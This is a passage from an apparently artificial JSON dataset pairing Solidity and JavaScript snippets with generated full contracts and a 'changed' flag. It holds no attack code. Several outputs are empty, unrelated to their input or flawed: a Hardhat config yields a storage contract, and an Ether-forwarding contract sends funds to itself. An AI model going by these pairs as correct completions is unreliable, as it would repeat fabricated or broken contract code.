sender.voted = true;\n        sender.vote = proposal;\n        proposals[proposal].voteCount += sender.weight;\n    }\n\n    function winningProposal() public view returns (uint winningProposal_){\n        uint winningVoteCount = 0;\n        for (uint p = 0; p < proposals.length; p++) {\n            if (proposals[p].voteCount > winningVoteCount){\n                winningVoteCount = proposals[p].voteCount;\n                winningProposal_ = p;\n            }\n        }\n    }\n\n    function winnerName() external view returns (bytes32 winnerName_){\n        winnerName_ = proposals[winningProposal()].names;\n    }\n}\n\n",
        "changed": 0
    },
    "71.sol": {
        "input": "    function transferEth(address payable _to, uint _amount) public {\n        (bool success, ) = _to.call{value: _amount}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n\nfunction claimEth() public {\n    if (balanceOf(msg.sender) > 100) {\n        balances[msg.sender] = balances[msg.sender[.sub(100);\n        transferEth(msg.sender, 5);\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "72.sol": {
        "input": "function addStudentDetails (string memory _studentFirstName, string memory _studentLastName) public onlyClassTeacher(msg.sender){\n            StudentDetails storage studentObj = students[studentCount];\n    \n            studentObj.studentFirstName = _studentFirstName;\n            studentObj.studentLastName = _studentLastName;\n            studentObj.id = studentCount;\n            emit studentAdded(_studentFirstName, _studentLastName, msg.sender, studentCount);\n            studentCount++;\n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract School {\n    struct StudentDetails {\n        string studentFirstName;\n        string studentLastName;\n        uint id;\n    }\n\n    mapping(uint => StudentDetails) public students;\n    uint public studentCount;\n\n    address public classTeacher;\n\n    event studentAdded (\n        string studentFirstName,\n        string studentLastName,\n        address indexed addedBy,\n        uint id\n    );\n\n    constructor() public{\n        classTeacher = msg.sender;\n    }\n\n    modifier onlyClassTeacher(address _address) {\n        require(_address == classTeacher, \"Only class teacher can add students\");\n        _;\n    }\n\n    function addStudentDetails (string memory _studentFirstName, string memory _studentLastName) public onlyClassTeacher(msg.sender) {\n        StudentDetails storage studentObj = students[studentCount];\n\n        studentObj.studentFirstName = _studentFirstName;\n        studentObj.studentLastName = _studentLastName;\n        studentObj.id = studentCount;\n        emit studentAdded(_studentFirstName, _studentLastName, msg.sender, studentCount);\n        studentCount++;\n    }\n}\n\n",
        "changed": 0
    },
    "73.sol": {
        "input": "struct Owner {\n  address ownerAddress;\n  uint256 sinceWhen;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Ownership {\n    struct Owner {\n        address ownerAddress;\n        uint256 sinceWhen;\n    }\n\n    mapping(address => Owner) public owners;\n\n    constructor() public {\n        owners[msg.sender] = Owner({\n            ownerAddress: msg.sender,\n            sinceWhen: now\n        });\n    }\n\n    function addOwner(address _owner) public {\n        require(msg.sender == owners[msg.sender].ownerAddress, \"Only an owner can add a new owner\");\n        owners[_owner] = Owner({\n            ownerAddress: _owner,\n            sinceWhen: now\n        });\n    }\n\n    function removeOwner(address _owner) public {\n        require(msg.sender == owners[msg.sender].ownerAddress, \"Only an owner can remove an owner\");\n        delete owners[_owner];\n    }\n\n    function getOwner(address _owner) public view returns (address, uint256) {\n        return (owners[_owner].ownerAddress, owners[_owner].sinceWhen);\n    }\n}\n\n",
        "changed": 0
    },
    "75.sol": {
        "input": "contract MentalHealthCoin is ERC20, Ownable, ReentrancyGuard {\n\n    constructor() ERC20(\"Mental Health Coin\", \"MHC\") {\n      _mint(msg.sender, 500000000*(10**uint256(decimals()))); \n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "76.sol": {
        "input": "contract MultipleValues{\n    function returnValues() public pure returns (uint, bool, uint[3] memory) {\n        uint[3] memory memoryArray;\n        memoryArray[0]=1;\n        memoryArray[1]=2;\n        memoryArray[2]=3;\n        return (23, true, memoryArray);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MultipleValues {\n    function returnValues() public pure returns (uint, bool, uint[3] memory) {\n        uint[3] memory memoryArray;\n        memoryArray[0] = 1;\n        memoryArray[1] = 2;\n        memoryArray[2] = 3;\n        return (23, true, memoryArray);\n    }\n}\n\n",
        "changed": 0
    },
    "77.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract PokemonFactory {\n\n  struct Pokemon {\n    uint256 id;\n    string name;\n    Ability[] abilities;\n  }\n\n  struct Ability {\n    string name;\n    string description;\n  }\n\n  Pokemon[] public pokemons;\n\n  function createPokemon(string memory _name, string memory _abilityNme, string memory _abilityDscription) public {\n    uint id = pokemons.length;\n    Pokemon storage p = pokemons.push();\n    p.abilities.push(Ability(_abilityNme, _abilityDscription));\n    p.id = id;\n    p.name = _name;\n  }\n  \n  function retrieveAbilities(uint _id) external view returns(Ability[] memory){\n    return pokemons[_id].abilities;\n  }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.7.0 <0.9.0;\n\ncontract PokemonFactory {\n\n  struct Pokemon {\n    uint256 id;\n    string name;\n    Ability[] abilities;\n  }\n\n  struct Ability {\n    string name;\n    string description;\n  }\n\n  Pokemon[] public pokemons;\n\n  function createPokemon(string memory _name, string memory _abilityNme, string memory _abilityDscription) public {\n    uint id = pokemons.length;\n    // NOTE: First I create an 'empty' space in pokemons mapping\n    Pokemon storage p = pokemons.push();\n    // NOTE: Then after I created this space, I insert the values \n    p.abilities.push(Ability(_abilityNme, _abilityDscription));\n    p.id = id;\n    p.name = _name;\n  }\n  \n  // NOTE: Function for retrieve Abilities array values for a single pokemon using '_id' parameters for querying the mapping\n  function retrieveAbilities(uint _id) external view returns(Ability[] memory){\n    return pokemons[_id].abilities;\n  }\n}\n\n",
        "changed": 0
    },
    "78.sol": {
        "input": "function addXtoAccName( address _accNumber, string memory _xtoName ) public {\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract AddXtoAccName {\n    mapping( address => string ) accNames;\n\n    function addXtoAccName( address _accNumber, string memory _xtoName ) public {\n        string memory newName = string(abi.encodePacked(_xtoName, \"_x\"));\n        accNames[_accNumber] = newName;\n    }\n\n    function getAccName( address _accNumber ) public view returns (string memory) {\n        return accNames[_accNumber];\n    }\n}\n\n",
        "changed": 0
    },
    "79.sol": {
        "input": "await tether.approve(decentralbank.address, tokens(\"100\"), {\n  from: customer,\n});\n\nawait decentralbank.stakeTokens(tokens(\"100\"), {\n  from: customer,\n});\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface ITether {\n    function approve(address _spender, uint256 _value) external returns (bool);\n    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);\n}\n\ninterface IDecentralBank {\n    function stakeTokens(uint256 _amount) external;\n}\n\ncontract MyContract {\n    ITether public tether;\n    IDecentralBank public decentralbank;\n    address public customer;\n\n    constructor(address _tether, address _decentralbank, address _customer) {\n        tether = ITether(_tether);\n        decentralbank = IDecentralBank(_decentralbank);\n        customer = _customer;\n    }\n\n    function tokens(uint256 _amount) public pure returns (uint256) {\n        return _amount * 10 ** 18; // assuming tether has 18 decimals\n    }\n\n    function approveAndStakeTokens(uint256 _amount) public {\n        require(msg.sender == customer, \"Only the customer can call this function\");\n        uint256 amountInWei = tokens(_amount);\n        tether.approve(decentralbank, amountInWei);\n        decentralbank.stakeTokens(amountInWei);\n    }\n}\n\n",
        "changed": 0
    },
    "80.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function isMsgSenderAddressThis() public view returns (bool) {\n        return msg.sender == address(this);\n    }\n    \n    function yes() external view returns (bool) {\n        return this.isMsgSenderAddressThis();\n    }\n\n    function nope() external view returns (bool) {\n        return isMsgSenderAddressThis();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function isMsgSenderAddressThis() public view returns (bool) {\n        return msg.sender == address(this);\n    }\n    \n    function yes() external view returns (bool) {\n        // makes an external call to itself\n        // same as MyContract(address(this)).isMsgSenderAddressThis()\n        return this.isMsgSenderAddressThis();\n    }\n\n    function nope() external view returns (bool) {\n        // this is an internal call, so it returns false\n        return isMsgSenderAddressThis();\n    }\n}\n\n",
        "changed": 0
    },
    "81.sol": {
        "input": "    function PubtoAddr(string calldata str_) pure public returns(bytes20) {\n        bytes memory b = bytes(str_);\n        return( bytes20(uint160(uint256(keccak256(b)))) );\n    } \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StringToAddress {\n    function PubtoAddr(string calldata str_) pure public returns(bytes20) {\n        bytes memory b = bytes(str_);\n        return( bytes20(uint160(uint256(keccak256(b)))) );\n    }\n}\n\n",
        "changed": 0
    },
    "82.sol": {
        "input": "block.timestamp >= _openingTime\n\ncurl -X POST \\\n  http:\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"jsonrpc\": \"1.0\",\n    \"id\": \"curltest\",\n    \"method\": \"evm_increaseTime\",\n    \"params\": [\n      100000\n  ]\n}'\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TimeBased {\n    uint256 public _openingTime;\n\n    constructor(uint256 openingTime) public {\n        _openingTime = openingTime;\n    }\n\n    function isOpen() public view returns(bool) {\n        // Check if the current block timestamp is greater or equal than the contract's opening time\n        return block.timestamp >= _openingTime;\n    }\n}\n\n",
        "changed": 0
    },
    "83.sol": {
        "input": "\n    function log(string memory p0, string memory p1, string memory p2) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,string)\", p0, p1, p2));\n    }\n\n    console.log(\"your format string %s %s\", string(yourBytesVariable1), string(yourBytesVariable2));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract LogContract {\n    event LogEvent(string p0, string p1, string p2);\n\n    function log(string memory p0, string memory p1, string memory p2) internal {\n        _sendLogPayload(p0, p1, p2);\n    }\n\n    function _sendLogPayload(string memory p0, string memory p1, string memory p2) internal {\n        emit LogEvent(p0, p1, p2);\n    }\n    \n    function console(string memory yourBytesVariable1, string memory yourBytesVariable2) public {\n        log(\"your format string %s %s\", yourBytesVariable1, yourBytesVariable2);\n    }\n}\n\n",
        "changed": 0
    },
    "84.sol": {
        "input": " import \"@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol\";\n\n address poolAddress = IUniswapV3Factory(_factory).getPool(\n        _token0,\n        _token1,\n        _fee\n    );\n\nmapping(address => mapping(address => mapping(uint24 => address))) public override getPool;\n\nrequire(poolAddress!=address(0))\n\n\n",
        "output": "",
        "changed": 0
    },
    "85.sol": {
        "input": "modifier callerIsUser() {\n  require(tx.origin == msg.sender, \"The caller is another contract\");\n  _;\n}\n\nfunction example() callerIsUser {\n  ...\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    modifier callerIsUser() {\n        require(tx.origin == msg.sender, \"The caller is another contract\");\n        _;\n    }\n\n    function example() public callerIsUser {\n        // Insert function logic here\n    }\n}\n\n",
        "changed": 0
    },
    "86.sol": {
        "input": "function AcceptPayment(uint32 amount) public {\n   bool success = tokenUSDC.transferFrom(msg.sender, address(this), amount * priceCapsule);\n   require(success, \"Could not transfer token. Missing approval?\");\n   bulkMint(_msgSender(), amount);\n}\n\n\n",
        "output": "",
        "changed": 1
    },
    "87.sol": {
        "input": "    SimpleStorage[] public simpleStorageArray; \n\n    function createSimpleStorageContract() public {\n    SimpleStorage simpleStorage = new SimpleStorage();\n    simpleStorageArray.push(simpleStorage);\n\n    }  \n       \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint public storedData;\n\n    constructor() public {\n        storedData = 0;\n    }\n\n    function set(uint x) public {\n        storedData = x;\n    }\n\n    function get() public view returns (uint) {\n        return storedData;\n    }\n}\n\ncontract SimpleStorageFactory {\n    SimpleStorage[] public simpleStorageArray;\n\n    function createSimpleStorageContract() public {\n        SimpleStorage simpleStorage = new SimpleStorage();\n        simpleStorageArray.push(simpleStorage);\n    }\n    \n    function getSimpleStorageContractCount() public view returns (uint) {\n        return simpleStorageArray.length;\n    }\n}\n\n",
        "changed": 0
    },
    "88.sol": {
        "input": "uint8 number;\n\nfunction isNumberValid() external returns (bool) {\n    return (\n        number >= 100  \n        && number <= 200  \n    );\n}\n\nuint8 number;\n\nfunction isNumberValid() external returns (bool) {\n    uint8 _number = number; \n    return (\n        _number >= 100  \n        && _number <= 200  \n    );\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NumberContract {\n    uint8 number;\n\n    function setNumber(uint8 _number) public {\n        number = _number;\n    }\n\n    function isNumberValid() external view returns (bool) {\n        return (number >= 100 && number <= 200);\n    }\n}\n\n",
        "changed": 0
    },
    "89.sol": {
        "input": "import Station from './build/Station.json';\n\n\n\n  const station = (address) => {\n    return new web3.eth.Contract(JSON.parse(Station.interface), address);\n  };\n\nexport default station;\n\npragma solidity ^0.4.17;\ncontract StationFactory {\n    address[] public deployedStations;\n\n    function createStation(uint minimum) public {\n        address newStation = new Station(minimum, msg.sender);\n        deployedStations.push(newStation);\n    }\n\n    function getDeployedStations() public view returns (address[]) {\n        return deployedStations;\n    }\n}\n\ncontract Station {\n    struct Request {\n        string description;\n        uint value;\n        address recipient;\n        bool complete;\n        uint approvalCount;\n        mapping(address => bool) approvals;\n    }\n\n    Request[] public requests;\n    address public manager;\n    uint public minimumContribution;\n    mapping(address => bool) public approvers;\n    uint public approversCount;\n\n    modifier restricted() {\n        require(msg.sender == manager);\n        _;\n    }\n\n    function Station(uint minimum, address creator) public {\n        manager = creator;\n        minimumContribution = minimum;\n    }\n\n    function contribute() public payable {\n        require(msg.value > minimumContribution);\n\n        approvers[msg.sender] = true;\n        approversCount++;\n    }\n\n    function createRequest(string description, uint value, address recipient) public restricted {\n        Request memory newRequest = Request({\n           description: description,\n           value: value,\n           recipient: recipient,\n           complete: false,\n           approvalCount: 0\n        });\n\n        requests.push(newRequest);\n    }\n\n    function approveRequest(uint index) public {\n        Request storage request = requests[index];\n\n        require(approvers[msg.sender]);\n        require(!request.approvals[msg.sender]);\n\n        request.approvals[msg.sender] = true;\n        request.approvalCount++;\n    }\n\n    function finalizeRequest(uint index) public restricted {\n        Request storage request = requests[index];\n\n        require(request.approvalCount > (approversCount / 2));\n        require(!request.complete);\n\n        request.recipient.transfer(request.value);\n        request.complete = true;\n    }\n\n    function getSummary() public view returns (\n      uint, uint, uint, uint, address\n      ) {\n        return (\n          minimumContribution,\n          this.balance,\n          requests.length,\n          approversCount,\n          manager\n        );\n    }\n\n    function getRequestsCount() public view returns (uint) {\n        return requests.length;\n    }\n}\n\n\nconst HDWalletProvider = require('@truffle/hdwallet-provider');\nconst Web3 = require('web3');\nconst compiledCRMS = require('./build/crms.json');\nconst compiledStationFactory = require('./build/StationFactory.json');\n\nconst provider = new HDWalletProvider(\n  'YOUR METAMASK PHRASE',\n  'INFURA LINK'\n);\n\nconst web3 = new Web3(provider);\n\n\nconst deploy = async()=>{\n  const accounts = await web3.eth.getAccounts();\n\n  console.log('Attempting to deploy from account', accounts[0]);\nconst result =  await new web3.eth.Contract(JSON.parse(compiledCRMS.interface))\n  .deploy({data:compiledCRMS.bytecode })\n  .send({gas:'10000000',from:accounts[0]});\n\nconst result_1 = await new web3.eth.Contract(JSON.parse(compiledStationFactory.interface))\n.deploy({data:compiledStationFactory.bytecode})\n.send({gas:'10000000',from:accounts[0]});\n\n\nconsole.log('CRMS Contract deployed to',result.options.address);\nconsole.log('Station Factory Contract deployed to',result_1.options.address);\nprovider.engine.stop();\n};\ndeploy();\n\n\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract StationFactory {\n    address[] public deployedStations;\n\n    function createStation(uint minimum) public {\n        address newStation = new Station(minimum, msg.sender);\n        deployedStations.push(newStation);\n    }\n\n    function getDeployedStations() public view returns (address[]) {\n        return deployedStations;\n    }\n}\n\ncontract Station {\n    struct Request {\n        string description;\n        uint value;\n        address recipient;\n        bool complete;\n        uint approvalCount;\n        mapping(address => bool) approvals;\n    }\n\n    Request[] public requests;\n    address public manager;\n    uint public minimumContribution;\n    mapping(address => bool) public approvers;\n    uint public approversCount;\n\n    modifier restricted() {\n        require(msg.sender == manager);\n        _;\n    }\n\n    function Station(uint minimum, address creator) public {\n        manager = creator;\n        minimumContribution = minimum;\n    }\n\n    function contribute() public payable {\n        require(msg.value > minimumContribution);\n\n        approvers[msg.sender] = true;\n        approversCount++;\n    }\n\n    function createRequest(string description, uint value, address recipient) public restricted {\n        Request memory newRequest = Request({\n           description: description,\n           value: value,\n           recipient: recipient,\n           complete: false,\n           approvalCount: 0\n        });\n\n        requests.push(newRequest);\n    }\n\n    function approveRequest(uint index) public {\n        Request storage request = requests[index];\n\n        require(approvers[msg.sender]);\n        require(!request.approvals[msg.sender]);\n\n        request.approvals[msg.sender] = true;\n        request.approvalCount++;\n    }\n\n    function finalizeRequest(uint index) public restricted {\n        Request storage request = requests[index];\n\n        require(request.approvalCount > (approversCount / 2));\n        require(!request.complete);\n\n        request.recipient.transfer(request.value);\n        request.complete = true;\n    }\n\n    function getSummary() public view returns (\n      uint, uint, uint, uint, address\n      ) {\n        return (\n          minimumContribution,\n          this.balance,\n          requests.length,\n          approversCount,\n          manager\n        );\n    }\n\n    function getRequestsCount() public view returns (uint) {\n        return requests.length;\n    }\n}\n\n",
        "changed": 0
    },
    "90.sol": {
        "input": "function showStakeAmount() external view returns(uint256){\n    return StakingAmountOfUsers(msg.sender);\n}\n\ninterface StakingInterface{\n    function showStakeAmount() external view returns(uint256);\n}\n\ncontract CMRGachaSeedNFT is ERC721URIStorage, AccessControl, ERC721Enumerable {\n    uint256 AmountThatShouldBeStaked;\n\n    StakingInterface StakingContract;\n\n    constructor(address STAKING_CONTRACT_ADDRESS){\n        StakingContract = StakingInterface(STAKING_CONTRACT_ADDRESS);\n    }\n    \n    modifier isStaked(){\n        require(StakingContract.showStakeAmount() > AmountThatShouldBeStaked, \"You did not stake enough amount of X token\");\n        _;\n    }\n\n    function mintItem(address _address, string memory _tokenURI)\n        public\n        onlyRole(CONTRACT_ROLE)\n        returns (uint256)\n        isStaked()\n    {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface StakingInterface {\n    function showStakeAmount() external view returns(uint256);\n}\n\n",
        "changed": 1
    },
    "91.sol": {
        "input": " pragma solidity >=0.7.0 <0.9.0;\n\n\ncontract new_nth{\n\n function nth(uint n,int a,int b,int c) pure public returns(int){\n    int[100] memory arr;\n    arr[0] = a;\n    arr[1] =b;\n    arr[2] = c;\n    uint i;\n    for(i =3;i<n;++i){\n        arr[i] = arr[i-1]+arr[i - 2 ]+arr[i - 3];\n    }\n    return arr[n-1];\n }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\n pragma solidity >=0.7.0 <0.9.0;\n\n\ncontract new_nth{\n\n function nth(uint n,int a,int b,int c) pure public returns(int){\n    int[100] memory arr;\n    arr[0] = a;\n    arr[1] =b;\n    arr[2] = c;\n    uint i;\n    for(i =3;i<n;++i){\n        arr[i] = arr[i-1]+arr[i - 2 ]+arr[i - 3];\n    }\n    return arr[n-1];\n }\n}\n\n",
        "changed": 0
    },
    "93.sol": {
        "input": "int[5] public array = [int(1), int(2), int(3), int(4), int(5)];\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    int[5] public array = [int(1), int(2), int(3), int(4), int(5)];\n\n    function getArray() public view returns (int[5] memory) {\n        return array;\n    }\n}\n\n",
        "changed": 0
    },
    "94.sol": {
        "input": "contract YourContract {\n   \n    function destruct(address addr) ownerOnly {\n         selfdestruct(addr);\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract YourContract {\n    address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n   \n    modifier ownerOnly() {\n        require(msg.sender == owner, \"You must be the owner\");\n        _;\n    }\n    \n    function destruct(address payable addr) public ownerOnly {\n        selfdestruct(addr);\n    }\n}\n\n",
        "changed": 0
    },
    "95.sol": {
        "input": "function updateStructA(string memory _newValue) public {\n    tests[msg.sender].a = _newValue;\n}\n\nfunction updateStructB(string memory _newValue) public {\n    tests[msg.sender].b = _newValue;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestContract {\n\n    struct Test {\n        string a;\n        string b;\n    }\n\n    mapping(address => Test) public tests;\n\n    function updateStructA(string memory _newValue) public {\n        tests[msg.sender].a = _newValue;\n    }\n\n    function updateStructB(string memory _newValue) public {\n        tests[msg.sender].b = _newValue;\n    }\n}\n\n",
        "changed": 0
    },
    "96.sol": {
        "input": "function store(uint256 _favoriteNumber) public {\nfavoriteNumber = _favoriteNumber;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FavoriteNumber {\n    // Declares a state variable `favoriteNumber`\n    uint256 private favoriteNumber;\n\n    // Declares a function `store()` which takes an input `favoriteNumber`\n    function store(uint256 _favoriteNumber) public {\n        favoriteNumber = _favoriteNumber;\n    }\n\n    // Declares a function `retrieve()` to fetch the stored `favoriteNumber`\n    function retrieve() public view returns (uint256) {\n        return favoriteNumber;\n    }\n}\n\n",
        "changed": 0
    },
    "97.sol": {
        "input": "contract Test {\n    address public user;\n    error MyCustomError(address _address);\n\n    function revertError() public view {\n    if(user!=address(0)) \n    { \n        revert MyCustomError({_address: msg.sender});\n        }\n    }\n }\n\n\n",
        "output": "contract Test {\n    address public user;\n    /// custom error\n    error MyCustomError(address _address);\n\n    function revertError() public view {\n    // I just had to pass a valid condition. address(0)=0x0000000000000000000000000000000000000000\n    // if(user) would give this error: \"Type address is not implicitly convertible to expected type bool\"\n    if(user!=address(0)) \n    { \n        revert MyCustomError({_address: msg.sender});\n        }\n    }\n }\n\n",
        "changed": 0
    },
    "98.sol": {
        "input": "    struct Users{\n       string fullname;\n       string[] email;\n    }\n    mapping(address => Users) private userinfo;\n\n    function compareString(string memory str1, string memory str2) internal returns (bool) {\n        if(bytes(str1).length != bytes(str2).length) {\n            return false;\n        } else {\n            return keccak256(abi.encodePacked(str1)) == keccak256(abi.encodePacked(str2));\n        }\n    }\n\n    function removeEmail(address userAddress, string memory emailToRemove) external {\n        string[] memory emails = userinfo[userAddress].email;\n        uint256 emailLength = emails.length;\n        for (uint256 i; i<emailLength; i++) {\n            if (compareString(emails[i], emailToRemove)) {\n                userinfo[userAddress].email[i] = userinfo[userAddress].email[emailLength - 1];\n                userinfo[userAddress].email.pop();\n                break;\n            }\n        }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UserContract {\n    struct Users{\n       string fullname;\n       string[] email;\n    }\n    \n    mapping(address => Users) private userInfo;\n\n    function compareString(string memory str1, string memory str2) internal pure returns (bool) {\n        if(bytes(str1).length != bytes(str2).length) {\n            return false;\n        } else {\n            return keccak256(abi.encodePacked(str1)) == keccak256(abi.encodePacked(str2));\n        }\n    }\n\n    function removeEmail(address userAddress, string memory emailToRemove) external {\n        string[] storage emails = userInfo[userAddress].email;\n        uint256 emailLength = emails.length;\n        for (uint256 i; i<emailLength; i++) {\n            if (compareString(emails[i], emailToRemove)) {\n                emails[i] = emails[emailLength - 1];\n                emails.pop();\n                break;\n            }\n        }\n    }\n\n    function addEmail(address userAddress, string memory emailToAdd, string memory fullName) external {\n        Users storage user = userInfo[userAddress];\n        user.fullname = fullName;\n        user.email.push(emailToAdd);\n    }\n\n    function getEmails(address userAddress) external view returns(string[] memory) {\n        return userInfo[userAddress].email;\n    }\n}\n\n",
        "changed": 0
    },
    "102.sol": {
        "input": "pragma solidity ^0.8.7;\n\ncontract MAth{\n\nuint public publicM;\nuint public remPublic;\n\n  constructor()  {\n    publicM = 10;\n  }\n  function setRemPublic() public  returns(uint)  {\n   remPublic = publicM;\n   return remPublic;\n  }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT \npragma solidity ^0.8.7;\n\ncontract MAth{\n\nuint public publicM;\nuint public remPublic;\n\n  constructor()  {\n    publicM = 10;\n  }\n  function setRemPublic() public  returns(uint)  {\n   remPublic = publicM;\n   return remPublic;\n  }\n}\n\n",
        "changed": 0
    },
    "103.sol": {
        "input": "payable(msg.sender).transfer(balance / 100 * 10);\npayable(_friend).transfer(balance / 100 * 90);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ShareProfit {\n    address payable public owner;\n    address payable public friend;\n    \n    constructor(address payable _friend) {\n        owner = payable(msg.sender);\n        friend = _friend;\n    }\n\n    function shareBalance() public {\n        require(address(this).balance > 0, \"No balance to share\");\n\n        uint256 balance = address(this).balance;\n        owner.transfer(balance / 100 * 10);\n        friend.transfer(balance / 100 * 90);\n    }\n\n    receive() external payable {\n        // function body left intentionally empty\n    }\n}\n\n",
        "changed": 0
    },
    "104.sol": {
        "input": "module.exports = {\n      solidity: {\n        version: \"0.8.9\",\n        settings: {\n          optimizer: {\n            enabled: true,\n            runs: 1000,\n          },\n        },\n      },\n    };\n\nsolidity: {\n    compilers: [\n      {\n        version: \"0.6.12\",\n      },\n      {\n        version: \"0.5.16\",\n      },\n      {\n        version: \"0.6.6\",\n        settings: {\n          optimizer: {\n            enabled: true,\n            runs: 1000,\n          },\n        },\n      },\n    ],\n  },\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint public data;\n\n    function set(uint x) public {\n        data = x;\n    }\n\n    function get() public view returns (uint) {\n        return data;\n    }\n}\n\n",
        "changed": 0
    },
    "105.sol": {
        "input": "modifier onlyOwner() {\n   require(isOwner());\n   _;\n}\n\nmodifier onlyOwner() {\n   _;\n   require(isOwner());\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Ownable {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() internal {\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), _owner);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(isOwner());\n        _;\n    }\n\n    function isOwner() public view returns (bool) {\n        return msg.sender == _owner;\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        _transferOwnership(newOwner);\n    }\n\n    function _transferOwnership(address newOwner) internal {\n        require(newOwner != address(0));\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\n",
        "changed": 1
    },
    "107.sol": {
        "input": "   function invest(uint256 amount) payable external{\n\n        recordTransaction(address(this), amount, false);\n        recordTransaction(owner, amount, true);\n\n        address payable contractAddress = payable(address(this));\n        contractAddress.send(amount);\n    }\n\nfunction send_ETH(address payable recipient) payable public {\n    uint256 minimumUSD = 0.01 * 1e18;\n    require(getConversionRate(msg.value) >= minimumUSD, \"You need to spend more ETH!\");\n    \n    this.invest(msg.value);\n    this.fund(recipient);\n}\n\n   function invest() internal{\n\n        recordTransaction(address(this), amount, false);\n        recordTransaction(owner, amount, true);\n    }\n\nconst transaction = {\n 'to': '0x31B98D14007bDEe637298086988A0bBd31184523', \n 'value': 1, \n 'gas': 30000,\n 'maxFeePerGas': 1000000108,\n 'nonce': nonce,\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SmartContract {\n    address public owner;\n    mapping(address => uint256) public balances;\n\n    event TransactionRecorded(address indexed _from, uint256 _value, bool _isIncoming);\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function invest(uint256 amount) payable external {\n        require(msg.value >= amount, \"Insufficient funds sent!\");\n\n        recordTransaction(address(this), amount, false);\n        recordTransaction(owner, amount, true);\n\n        address payable contractAddress = payable(address(this));\n        (bool success,) = contractAddress.call{value: amount}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n\n    function send_ETH(address payable recipient) payable public {\n        uint256 minimumUSD = 0.01 * 1e18;\n        require(getConversionRate(msg.value) >= minimumUSD, \"You need to spend more ETH!\");\n\n        this.invest(msg.value);\n        fund(recipient);\n    }\n\n    function invest() internal {\n        recordTransaction(address(this), msg.value, false);\n        recordTransaction(owner, msg.value, true);\n    }\n\n    function recordTransaction(address _from, uint256 _value, bool _isIncoming) internal {\n        balances[_from] += _value;\n        emit TransactionRecorded(_from, _value, _isIncoming);\n    }\n\n    function getConversionRate(uint256 _amount) public pure returns(uint256) {\n        // Here should be the logic of getting the conversion rate from ETH to USD\n        // Assuming 1 ETH = 2000 USD\n        return _amount * 2000;\n    }\n\n    function fund(address payable _recipient) public payable {\n        (bool success,) = _recipient.call{value: msg.value}(\"\");\n        require(success, \"Failed to send Ether\");\n    }\n}\n\n",
        "changed": 1
    },
    "108.sol": {
        "input": "\npragma solidity 0.8.16;\n\n\ncontract ICO {\n    address public admin;\n    address payable public ICOWallet;\n\n    IERC20 public token;\n\n    uint public tokenPrice = 0.000000001 ether;\n    uint public hardCap = 8 ether;\n    uint public raisedAmount;\n    uint public minInvestment = 0.005 ether;\n    uint public maxInvestment = 1 ether;\n    uint public icoStartTime;\n    uint public icoEndTime;\n\n    mapping(address => uint) public investedAmountOf;\n\n    enum State {\n        BEFORE,\n        RUNNING,\n        END,\n        HALTED\n    }\n    State public ICOState;\n\n    event Invest(\n        address indexed from,\n        address indexed to,\n        uint value,\n        uint tokens\n    );\n    event TokenBurn(address to, uint amount, uint time);\n\n    constructor(address payable _icoWallet, address _token) {\n        admin = msg.sender;\n        ICOWallet = _icoWallet;\n        token = IERC20(_token);\n    }\n\n    modifier onlyAdmin() {\n        require(msg.sender == admin, \"Admin Only function\");\n        _;\n    }\n\n    receive() external payable {\n        invest();\n    }\n\n    fallback() external payable {\n        invest();\n    }\n\n\n    function getICOState() external view returns (string memory) {\n        if (ICOState == State.BEFORE) {\n            return \"Not Started\";\n        } else if (ICOState == State.RUNNING) {\n            return \"Running\";\n        } else if (ICOState == State.END) {\n            return \"End\";\n        } else {\n            return \"Halted\";\n        }\n    }\n\n\n    function startICO() external onlyAdmin {\n        require(ICOState == State.BEFORE, \"ICO isn't in before state\");\n\n        icoStartTime = block.timestamp;\n        icoEndTime = icoStartTime + (2 